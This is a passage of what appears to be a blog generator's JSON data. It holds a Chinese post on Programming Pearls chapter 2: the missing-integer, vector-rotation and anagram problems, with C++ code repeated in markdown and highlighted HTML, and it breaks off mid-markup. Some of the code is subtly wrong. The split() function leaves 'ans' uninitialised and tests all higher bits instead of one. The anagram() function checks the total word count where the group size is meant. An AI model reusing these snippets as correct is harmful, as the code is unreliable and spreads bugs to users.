2.内存有限\n\n从整数的二进制表示入手，采用二分搜索。\n\n第一趟需要读入40亿个数，判断每个数最高位是0还是1，将第一位是0的存入一个文件，第一位是1的存入另一个文件。于是将40亿个数分被成了两份，而缺失的数必定会在较小的那一份里面。然后，选取较小的那一份，再按照第二位是否为1，分成两份。依次处理每一位，直到有一个分组的个数为0.\n\n举个例子，设数集是｛1，2，3，4，5，6，7，8，9，10｝，按照第一位是0/1分组得到\n\n    第一位为0: 1，2，3，4，5，6，7（7个数）\n\t第一位为1: 8，9，10（3个数）\n\n第一位为1的数只有3个，小于16/2 ＝ 8，所以缺失的数在第二组，当然第一组也缺失了0.我们选择第二组继续进行分组\n\n    第二位为0: 8，9，10（3个数）\n\t第二位为1:（0个数）\n\n现在我们得到一个分组包含的数字个数为0，于是我们找到了10之后的数字11，12，13，14，15都缺失了。\n\n``` c++\n// a是原始数组，b是当前位为1的数组，c是当前位为0的数组\nint split(int *a, int *b, int *c, int a_len,int bit)\n{\n\tint b_iterator, c_iterator, i;\n\tint v = 0, ans;\n\twhile(bit--){ // bit starts from 31\n\t\tv = (1<<bit);\n\t\tfor(i = b_iterator = c_iterator = 0;i<a_len;++i)\n\t\t{\n\t\t\tif(a[i]>>bit) b[b_iterator ++] = a[i];\n\t\t\telse c[c_iterator ++] = a[i];\n\t\t}\n\t\tif(b_iterator <= c_iterator){\n\t\t\tans += v;\n\t\t\ta = b;\n\t\t\ta_len = b_iterator;\n\t\t}else{\n\t\t\ta = c;\n\t\t\ta_len = c_iterator;\n\t\t}\n\t}\n\treturn ans;\n}\n```\n\n### 问题B\n\n>将一个n元一维向量向左旋转 i 个位置。<br>例如，当 n = 8且 i = 3时，向量 abcdefgh 旋转为 defghabc。\n\n借用书上原话，我们将问题看成是把数组ab转换成ba，同时假定我们拥有一个函数可以将数组中特定部分的元素求逆。从ab开始，首先对a求逆得到a^r b，然后对b求逆得到a^r b^r。最后对整体求逆，得到(a^r b^r)^r,此时就恰好是ba。\n\n\n``` c++\nvoid reverse(int i,int j)\n{\n\tint tmp;\n\twhile(i < j)\n\t{\n\t\ttmp = x[i];\n\t\tx[i] = x[j];\n\t\tx[j] = tmp;\n\t\t++i;--j;\n\t}\n}\n\nvoid rotate(int i, int n)\n{\n\treverse(0,i-1);\n\treverse(i,n-1);\n\treverse(0,n-1);\n}\n```\n这个方法在**时间空间上的效率都很高**，而且思路简单不容易出错。\n\n还有一种运用移位的方法。书上称之为**精巧的杂技动作**。\n\n首先移动x[0]到临时变量t，然后移动x[i]至x[0]，x[2i]至x[i]，依次类推(x中的所有下标对n取模)，直至返回到取x[0]中的元素，此时改为从t取值然后终止过程。如果该过程没有移动全部元素，就从x[1]开始再次进行移动，直到所有的元素都已经移动为止。\n\n``` c++\n//传说中的共(g)产(c)党(d)算法,求最大公约数\nint gcd(int a, int b)\n{\n    if(b == 0) return a;\n    return gcd(b, a % b);\n}\n//num为等待旋转的数组,len为长度,rotdist为位移长度\nvoid rotate(int *nums, int len, int rotdist) {\n    int i;\n    for (i = 0; i < gcd(rotdist, len); i++) {\n        int tmp = nums[i];\n        int j = i;\n        while (true) {\n            int k = (j + rotdist) % len;\n            if (k == i) break;\n            nums[j] = nums[k];\n            j = k;\n        }\n        nums[j] = tmp;\n    }\n}\n```\n\n### 问题C\n\n>给定一个英语词典，找出其中的所有变位词集合。例如，\"pots\"、\"stop\"、\"tops\"互为变位词，因为每一个单词都可以通过改变其他单词中字母的顺序来得到。\n\n我们可以标识字典里的每一个词，使得在相同变位词类中的单词具有相同的标识。然后，将具有相同标识的单词集中在一起。这将原始的变味词问题简化为两个子问题：选择标识和集中具有相同的单词。\n对于第一个问题，我们可以使用基于排序的标识：将单词中的字母表顺序排列。\"deposit\"的标识就是\"deiopst\"，这也是\"dopiest\"和其他任何该类单词的标识。要解决第二个问题，我们将所有的单词按照其标识的顺序排序。\n\n这里用hash table来解决\n\n``` c++\nvector<string> anagram(vector<string>& Strs)\n{\n\tunordered_map<string, vector<int>> map;\n\tvector<string> ans;\n\tint num = Strs.size();\n\tstring tmp;\n\tfor(int i = 0;i<num;++i)\n\t{\n\t\ttmp = Strs[i];\n\t\tsort(tmp.begin(), tmp.end());\n\t\tmap[tmp].push_back(i);\n\t}\n\tfor(auto &m : map)\n\t{\n\t\tint n = m.second.size();\n\t\tif(num > 1)\n\t\t\tfor(int i = 0;i<n;++i)\n\t\t\t\tans.push_back(Strs[m.second[i]]);\n\t}\n\treturn ans;\n}\n\n```\n\n","slug":"BCZJ2","published":1,"date":"2016-10-14T16:00:00.000Z","updated":"2018-04-23T11:22:18.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizay0006rikey2v985ir","content":"<blockquote>\n<p>“字字珠玑”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>书是某github大神推荐的，买了有一段时间了，却一直没看，今天静下心来读一读。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>第二章很短，在本章开头提出了三个问题，就在此对这三个问题进行讨论和解决。</p>\n<h3 id=\"问题A\"><a href=\"#问题A\" class=\"headerlink\" title=\"问题A\"></a>问题A</h3><blockquote>\n<p>给定一个最多包含 40亿个随机排列的 32位整数的顺序文件，找出一个不在文件中的 32位整数。（为什么一定有数缺失）<br>在具有足够内存的情况下，如何解决该问题？<br>如果有几个外部的“临时”文件可用，但是仅有几百字节的内存，又该如何解决该问题？</p>\n</blockquote>\n<p>因为40亿小于2的32次方所以一定有数缺失。</p>\n<h4 id=\"1-内存足够\"><a href=\"#1-内存足够\" class=\"headerlink\" title=\"1.内存足够\"></a>1.内存足够</h4><p>可以使用位图（第一章中有介绍），使用大小为2的32次方除以8字节=512MB的位图来表示出现的整数。</p>\n<h4 id=\"2-内存有限\"><a href=\"#2-内存有限\" class=\"headerlink\" title=\"2.内存有限\"></a>2.内存有限</h4><p>从整数的二进制表示入手，采用二分搜索。</p>\n<p>第一趟需要读入40亿个数，判断每个数最高位是0还是1，将第一位是0的存入一个文件，第一位是1的存入另一个文件。于是将40亿个数分被成了两份，而缺失的数必定会在较小的那一份里面。然后，选取较小的那一份，再按照第二位是否为1，分成两份。依次处理每一位，直到有一个分组的个数为0.</p>\n<p>举个例子，设数集是｛1，2，3，4，5，6，7，8，9，10｝，按照第一位是0/1分组得到</p>\n<pre><code>第一位为0: 1，2，3，4，5，6，7（7个数）\n第一位为1: 8，9，10（3个数）\n</code></pre><p>第一位为1的数只有3个，小于16/2 ＝ 8，所以缺失的数在第二组，当然第一组也缺失了0.我们选择第二组继续进行分组</p>\n<pre><code>第二位为0: 8，9，10（3个数）\n第二位为1:（0个数）\n</code></pre><p>现在我们得到一个分组包含的数字个数为0，于是我们找到了10之后的数字11，12，13，14，15都缺失了。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// a是原始数组，b是当前位为1的数组，c是当前位为0的数组</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">split</span><span class=\"params\">(<span class=\"keyword\">int</span> *a, <span class=\"keyword\">int</span> *b, <span class=\"keyword\">int</span> *c, <span class=\"keyword\">int</span> a_len,<span class=\"keyword\">int</span> bit)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> b_iterator, c_iterator, i;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> v = <span class=\"number\">0</span>, ans;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(bit--)&#123; <span class=\"comment\">// bit starts from 31</span></span><br><span class=\"line\">\t\tv = (<span class=\"number\">1</span>&lt;&lt;bit);</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(i = b_iterator = c_iterator = <span class=\"number\">0</span>;i&lt;a_len;++i)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(a[i]&gt;&gt;bit) b[b_iterator ++] = a[i];</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> c[c_iterator ++] = a[i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(b_iterator &lt;= c_iterator)&#123;</span><br><span class=\"line\">\t\t\tans += v;</span><br><span class=\"line\">\t\t\ta = b;</span><br><span class=\"line\">\t\t\ta_len = b_iterator;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\ta = c;</span><br><span class=\"line\">\t\t\ta_len = c_iterator;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"问题B\"><a href=\"#问题B\" class=\"headerlink\" title=\"问题B\"></a>问题B</h3><blockquote>\n<p>将一个n元一维向量向左旋转 i 个位置。<br>例如，当 n = 8且 i = 3时，向量 abcdefgh 旋转为 defghabc。</p>\n</blockquote>\n<p>借用书上原话，我们将问题看成是把数组ab转换成ba，同时假定我们拥有一个函数可以将数组中特定部分的元素求逆。从ab开始，首先对a求逆得到a^r b，然后对b求逆得到a^r b^r。最后对整体求逆，得到(a^r b^r)^r,此时就恰好是ba。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">reverse</span><span class=\"params\">(<span class=\"keyword\">int</span> i,<span class=\"keyword\">int</span> j)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> tmp;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(i &lt; j)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ttmp = x[i];</span><br><span class=\"line\">\t\tx[i] = x[j];</span><br><span class=\"line\">\t\tx[j] = tmp;</span><br><span class=\"line\">\t\t++i;--j;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rotate</span><span class=\"params\">(<span class=\"keyword\">int</span> i, <span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\treverse(<span class=\"number\">0</span>,i<span class=\"number\">-1</span>);</span><br><span class=\"line\">\treverse(i,n<span class=\"number\">-1</span>);</span><br><span class=\"line\">\treverse(<span class=\"number\">0</span>,n<span class=\"number\">-1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个方法在<strong>时间空间上的效率都很高</strong>，而且思路简单不容易出错。</p>\n<p>还有一种运用移位的方法。书上称之为<strong>精巧的杂技动作</strong>。</p>\n<p>首先移动x[0]到临时变量t，然后移动x[i]至x[0]，x[2i]至x[i]，依次类推(x中的所有下标对n取模)，直至返回到取x[0]中的元素，此时改为从t取值然后终止过程。如果该过程没有移动全部元素，就从x[1]开始再次进行移动，直到所有的元素都已经移动为止。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//传说中的共(g)产(c)党(d)算法,求最大公约数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">gcd</span><span class=\"params\">(<span class=\"keyword\">int</span> a, <span class=\"keyword\">int</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b == <span class=\"number\">0</span>) <span class=\"keyword\">return</span> a;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> gcd(b, a % b);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//num为等待旋转的数组,len为长度,rotdist为位移长度</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rotate</span><span class=\"params\">(<span class=\"keyword\">int</span> *nums, <span class=\"keyword\">int</span> len, <span class=\"keyword\">int</span> rotdist)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; gcd(rotdist, len); i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> tmp = nums[i];</span><br><span class=\"line\">        <span class=\"keyword\">int</span> j = i;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> k = (j + rotdist) % len;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (k == i) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            nums[j] = nums[k];</span><br><span class=\"line\">            j = k;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        nums[j] = tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"问题C\"><a href=\"#问题C\" class=\"headerlink\" title=\"问题C\"></a>问题C</h3><blockquote>\n<p>给定一个英语词典，找出其中的所有变位词集合。例如，”pots”、”stop”、”tops”互为变位词，因为每一个单词都可以通过改变其他单词中字母的顺序来得到。</p>\n</blockquote>\n<p>我们可以标识字典里的每一个词，使得在相同变位词类中的单词具有相同的标识。然后，将具有相同标识的单词集中在一起。这将原始的变味词问题简化为两个子问题：选择标识和集中具有相同的单词。<br>对于第一个问题，我们可以使用基于排序的标识：将单词中的字母表顺序排列。”deposit”的标识就是”deiopst”，这也是”dopiest”和其他任何该类单词的标识。要解决第二个问题，我们将所有的单词按照其标识的顺序排序。</p>\n<p>这里用hash table来解决</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">vector</span>&lt;<span class=\"built_in\">string</span>&gt; anagram(<span class=\"built_in\">vector</span>&lt;<span class=\"built_in\">string</span>&gt;&amp; Strs)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">unordered_map</span>&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt;&gt; <span class=\"built_in\">map</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">vector</span>&lt;<span class=\"built_in\">string</span>&gt; ans;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> num = Strs.size();</span><br><span class=\"line\">\t<span class=\"built_in\">string</span> tmp;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;num;++i)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ttmp = Strs[i];</span><br><span class=\"line\">\t\tsort(tmp.begin(), tmp.end());</span><br><span class=\"line\">\t\t<span class=\"built_in\">map</span>[tmp].push_back(i);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">auto</span> &amp;m : <span class=\"built_in\">map</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> n = m.second.size();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(num &gt; <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;n;++i)</span><br><span class=\"line\">\t\t\t\tans.push_back(Strs[m.second[i]]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“字字珠玑”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>书是某github大神推荐的，买了有一段时间了，却一直没看，今天静下心来读一读。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>第二章很短，在本章开头提出了三个问题，就在此对这三个问题进行讨论和解决。</p>\n<h3 id=\"问题A\"><a href=\"#问题A\" class=\"headerlink\" title=\"问题A\"></a>问题A</h3><blockquote>\n<p>给定一个最多包含 40亿个随机排列的 32位整数的顺序文件，找出一个不在文件中的 32位整数。（为什么一定有数缺失）<br>在具有足够内存的情况下，如何解决该问题？<br>如果有几个外部的“临时”文件可用，但是仅有几百字节的内存，又该如何解决该问题？</p>\n</blockquote>\n<p>因为40亿小于2的32次方所以一定有数缺失。</p>\n<h4 id=\"1-内存足够\"><a href=\"#1-内存足够\" class=\"headerlink\" title=\"1.内存足够\"></a>1.内存足够</h4><p>可以使用位图（第一章中有介绍），使用大小为2的32次方除以8字节=512MB的位图来表示出现的整数。</p>\n<h4 id=\"2-内存有限\"><a href=\"#2-内存有限\" class=\"headerlink\" title=\"2.内存有限\"></a>2.内存有限</h4><p>从整数的二进制表示入手，采用二分搜索。</p>\n<p>第一趟需要读入40亿个数，判断每个数最高位是0还是1，将第一位是0的存入一个文件，第一位是1的存入另一个文件。于是将40亿个数分被成了两份，而缺失的数必定会在较小的那一份里面。然后，选取较小的那一份，再按照第二位是否为1，分成两份。依次处理每一位，直到有一个分组的个数为0.</p>\n<p>举个例子，设数集是｛1，2，3，4，5，6，7，8，9，10｝，按照第一位是0/1分组得到</p>\n<pre><code>第一位为0: 1，2，3，4，5，6，7（7个数）\n第一位为1: 8，9，10（3个数）\n</code></pre><p>第一位为1的数只有3个，小于16/2 ＝ 8，所以缺失的数在第二组，当然第一组也缺失了0.我们选择第二组继续进行分组</p>\n<pre><code>第二位为0: 8，9，10（3个数）\n第二位为1:（0个数）\n</code></pre><p>现在我们得到一个分组包含的数字个数为0，于是我们找到了10之后的数字11，12，13，14，15都缺失了。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// a是原始数组，b是当前位为1的数组，c是当前位为0的数组</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">split</span><span class=\"params\">(<span class=\"keyword\">int</span> *a, <span class=\"keyword\">int</span> *b, <span class=\"keyword\">int</span> *c, <span class=\"keyword\">int</span> a_len,<span class=\"keyword\">int</span> bit)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> b_iterator, c_iterator, i;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> v = <span class=\"number\">0</span>, ans;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(bit--)&#123; <span class=\"comment\">// bit starts from 31</span></span><br><span class=\"line\">\t\tv = (<span class=\"number\">1</span>&lt;&lt;bit);</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(i = b_iterator = c_iterator = <span class=\"number\">0</span>;i&lt;a_len;++i)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(a[i]&gt;&gt;bit) b[b_iterator ++] = a[i];</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> c[c_iterator ++] = a[i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(b_iterator &lt;= c_iterator)&#123;</span><br><span class=\"line\">\t\t\tans += v;</span><br><span class=\"line\">\t\t\ta = b;</span><br><span class=\"line\">\t\t\ta_len = b_iterator;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\ta = c;</span><br><span class=\"line\">\t\t\ta_len = c_iterator;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"问题B\"><a href=\"#问题B\" class=\"headerlink\" title=\"问题B\"></a>问题B</h3><blockquote>\n<p>将一个n元一维向量向左旋转 i 个位置。<br>例如，当 n = 8且 i = 3时，向量 abcdefgh 旋转为 defghabc。</p>\n</blockquote>\n<p>借用书上原话，我们将问题看成是把数组ab转换成ba，同时假定我们拥有一个函数可以将数组中特定部分的元素求逆。从ab开始，首先对a求逆得到a^r b，然后对b求逆得到a^r b^r。最后对整体求逆，得到(a^r b^r)^r,此时就恰好是ba。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">reverse</span><span class=\"params\">(<span class=\"keyword\">int</span> i,<span class=\"keyword\">int</span> j)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> tmp;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(i &lt; j)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ttmp = x[i];</span><br><span class=\"line\">\t\tx[i] = x[j];</span><br><span class=\"line\">\t\tx[j] = tmp;</span><br><span class=\"line\">\t\t++i;--j;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rotate</span><span class=\"params\">(<span class=\"keyword\">int</span> i, <span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\treverse(<span class=\"number\">0</span>,i<span class=\"number\">-1</span>);</span><br><span class=\"line\">\treverse(i,n<span class=\"number\">-1</span>);</span><br><span class=\"line\">\treverse(<span class=\"number\">0</span>,n<span class=\"number\">-1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个方法在<strong>时间空间上的效率都很高</strong>，而且思路简单不容易出错。</p>\n<p>还有一种运用移位的方法。书上称之为<strong>精巧的杂技动作</strong>。</p>\n<p>首先移动x[0]到临时变量t，然后移动x[i]至x[0]，x[2i]至x[i]，依次类推(x中的所有下标对n取模)，直至返回到取x[0]中的元素，此时改为从t取值然后终止过程。如果该过程没有移动全部元素，就从x[1]开始再次进行移动，直到所有的元素都已经移动为止。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//传说中的共(g)产(c)党(d)算法,求最大公约数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">gcd</span><span class=\"params\">(<span class=\"keyword\">int</span> a, <span class=\"keyword\">int</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b == <span class=\"number\">0</span>) <span class=\"keyword\">return</span> a;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> gcd(b, a % b);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//num为等待旋转的数组,len为长度,rotdist为位移长度</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rotate</span><span class=\"params\">(<span class=\"keyword\">int</span> *nums, <span class=\"keyword\">int</span> len, <span class=\"keyword\">int</span> rotdist)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; gcd(rotdist, len); i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> tmp = nums[i];</span><br><span class=\"line\">        <span class=\"keyword\">int</span> j = i;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> k = (j + rotdist) % len;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (k == i) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            nums[j] = nums[k];</span><br><span class=\"line\">            j = k;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        nums[j] = tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"问题C\"><a href=\"#问题C\" class=\"headerlink\" title=\"问题C\"></a>问题C</h3><blockquote>\n<p>给定一个英语词典，找出其中的所有变位词集合。例如，”pots”、”stop”、”tops”互为变位词，因为每一个单词都可以通过改变其他单词中字母的顺序来得到。</p>\n</blockquote>\n<p>我们可以标识字典里的每一个词，使得在相同变位词类中的单词具有相同的标识。然后，将具有相同标识的单词集中在一起。这将原始的变味词问题简化为两个子问题：选择标识和集中具有相同的单词。<br>对于第一个问题，我们可以使用基于排序的标识：将单词中的字母表顺序排列。”deposit”的标识就是”deiopst”，这也是”dopiest”和其他任何该类单词的标识。要解决第二个问题，我们将所有的单词按照其标识的顺序排序。</p>\n<p>这里用hash table来解决</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 